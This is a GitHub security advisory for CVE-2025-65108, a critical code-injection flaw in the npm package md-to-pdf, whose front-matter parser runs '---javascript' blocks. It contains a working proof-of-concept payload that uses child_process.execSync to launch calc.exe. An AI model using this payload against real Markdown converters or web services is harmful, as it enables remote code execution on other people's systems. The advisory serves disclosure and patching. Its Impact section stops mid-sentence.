# [C] md-to-pdf vulnerable to arbitrary JavaScript code execution when parsing front matter

## Summary
Severity: Critical
Advisory: GHSA-547r-qmjm-8hvw
CVE: CVE-2025-65108
CWE: CWE-94
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2025-11-20
Source: https://github.com/advisories/GHSA-547r-qmjm-8hvw
Type: github-advisory

## Affected
- npm: `md-to-pdf` — affected >=0 <5.2.5

## Details
### Summary
A Markdown front-matter block that contains JavaScript delimiter causes the JS engine in gray-matter library to execute arbitrary code in the Markdown to PDF converter process of **md-to-pdf** library, resulting in remote code execution.

### Details
**md-to-pdf** uses the gray-matter library to parse front-matter. Gray-matter exposes a JavaScript engine that, when enabled or triggered by certain front-matter delimiters (e.g. ---js or ---javascript), will evaluate the front-matter contents as JavaScript. If user-supplied Markdown is fed to md-to-pdf and the front-matter contains malicious JS, the converter process will execute that code.


### PoC
```
const { mdToPdf } = require('md-to-pdf');

var payload = '---javascript\n((require("child_process")).execSync("calc.exe"))\n---RCE';

(async () => {
	await mdToPdf({ content: payload }, { dest: './output.pdf'});
})();
```
Running the PoC on Windows launches the calculator application, demonstrating arbitrary code execution.

### Impact

- Remote code execution in the process that performs Markdown->PDF conversion.
- If the converter is run in a web app or cloud service, an attacker uploading malicious Markdown can execute arbitrary commands on the

## References
- https://github.com/simonhaenisch/md-to-pdf/security/advisories/GHSA-547r-qmjm-8hvw
- https://nvd.nist.gov/vuln/detail/CVE-2025-65108
- https://github.com/simonhaenisch/md-to-pdf/commit/46bdcf2051c8d1758b391c1353185a179a47a4d9
- https://github.com/simonhaenisch/md-to-pdf
